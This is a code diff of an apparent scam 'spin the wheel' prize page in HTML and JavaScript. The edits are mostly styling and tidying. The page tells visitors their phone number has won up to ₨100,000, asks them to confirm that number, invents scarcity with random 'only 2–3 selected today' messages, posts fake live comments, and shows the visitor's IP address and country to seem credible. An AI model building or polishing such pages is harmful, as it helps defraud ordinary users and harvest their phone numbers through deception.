@@ -150,7 +150,7 @@
       position: relative;
       width: 300px;
       height: 300px;
-      margin: 0 auto 5px;
+      margin: 0 auto;
       z-index: 1;
     }
 
@@ -202,7 +202,7 @@
     .wheel-center-gift:active { transform: translate(-50%, -50%) scale(0.95); }
     .wheel-center-gift.disabled { pointer-events: none; opacity: 0.5; cursor: not-allowed; }
 
-    .spin-btn-wrapper { position: relative; z-index: 2; margin-top: 8px; width: 100%; display: flex; justify-content: center; }
+    .spin-btn-wrapper { position: relative; z-index: 2; margin-top: 24px; width: 100%; display: flex; justify-content: center; }
 
     .spin-btn {
       position: relative;
@@ -318,7 +318,7 @@
     #comments-section { width:100%; max-width:400px; margin-top:24px; display:flex; flex-direction:column; gap:10px; }
     .section-label { font-size:12px; color:#666; text-transform:uppercase; letter-spacing:1.5px; margin-bottom:8px; display:flex; align-items:center; gap:6px; }
     .comment-card {
-      background:var(--card-bg); border:1px solid #1a1a1a; padding:10px 12px; border-radius:12px;
+      background:var(--card-bg); padding:10px 12px; border-radius:12px;
       font-size:13px; display:flex; align-items:center; gap:10px;
       animation:slideIn 0.3s ease-out forwards; opacity:0; transform:translateY(-5px);
     }
@@ -449,7 +449,6 @@
   </div>
 </div>
 
-<!-- INITIAL POPUP -->
 <div id="initialModal" class="modal-overlay">
   <div class="modal">
     <h3>📱 Your phone number has been chosen to win upto! <span style="color:#FFD700;">₨100,000</span></h3>
@@ -468,7 +467,6 @@
   </div>
 </div>
 
-<!-- WIN POPUP -->
 <div id="winCongratsModal" class="modal-overlay">
   <div class="modal">
     <h3>🎉 Congratulations!</h3>
@@ -483,7 +481,6 @@
   </div>
 </div>
 
-<!-- CONFIRM POPUP -->
 <div id="winConfirmModal" class="modal-overlay">
   <div class="modal">
     <h3>📱 Confirm Your Phone Number</h3>
@@ -646,7 +643,6 @@
 
   function updateScarcity(){document.querySelectorAll('.scarcity-note').forEach(el=>el.textContent='🔥 You are 1 among only '+(Math.floor(Math.random()*2)+2)+' selected today!');}
 
-  // FIXED: Using flagcdn.com for reliable flag images
   function setCountryFlag(code) {
     const img = document.getElementById('countryFlagImg');
     if (code && code.length === 2) {
@@ -658,28 +654,15 @@
   async function getIP(){
     const ipEl = document.getElementById('userIP');
     const countryEl = document.getElementById('userCountry');
-    
     try {
       const r = await fetch('https://api.ipify.org?format=json');
       const d = await r.json();
       ipEl.textContent = d.ip;
-      
       const g = await fetch('https://ipapi.co/' + d.ip + '/json/');
       const gd = await g.json();
-      
-      if (gd.country_name && gd.country_code) {
-        setCountryFlag(gd.country_code);
-        countryEl.textContent = gd.country_name;
-      } else {
-        setCountryFlag('PK');
-        countryEl.textContent = 'Pakistan';
-      }
-    } catch(e) {
-      ipEl.textContent = 'Detected';
-      setCountryFlag('PK');
-      countryEl.textContent = 'Pakistan';
-    }
-    
+      if (gd.country_name && gd.country_code) { setCountryFlag(gd.country_code); countryEl.textContent = gd.country_name; }
+      else { setCountryFlag('PK'); countryEl.textContent = 'Pakistan'; }
+    } catch(e) { ipEl.textContent = 'Detected'; setCountryFlag('PK'); countryEl.textContent = 'Pakistan'; }
     document.getElementById('initialDevice').textContent = /iPad|iPhone|iPod/.test(navigator.userAgent) ? 'iOS Mobile' : /Android/.test(navigator.userAgent) ? 'Android Mobile' : 'Desktop';
     updateScarcity();
   }
@@ -719,7 +702,6 @@
     const c = autoComments[autoIndex % autoComments.length];
     comments.unshift({n:c.n, m:c.m, t:"just now", l:c.l});
     const d = renderComment(comments[0]);
-    d.style.border = '1px solid #2a2a2a';
     cl.insertBefore(d, cl.firstChild);
     if(cl.children.length > 40) cl.removeChild(cl.lastChild);
     autoIndex++;
@@ -731,7 +713,7 @@
     if(!text)return;
     comments.unshift({n:name,m:text,t:"Just now",l:location});
     const d=renderComment(comments[0]);
-    d.style.border='1px solid #25D366';d.style.background='#0d1a12';
+    d.style.background='#0d1a12';
     d.querySelector('.comment-avatar').style.background='var(--primary)';d.querySelector('.comment-avatar').style.color='#000';d.querySelector('.comment-avatar').textContent='✓';
     d.querySelector('.comment-name').innerHTML=name+' <span style="color:#25D366;font-size:11px">• Just now</span>';
     cl.insertBefore(d,cl.firstChild);
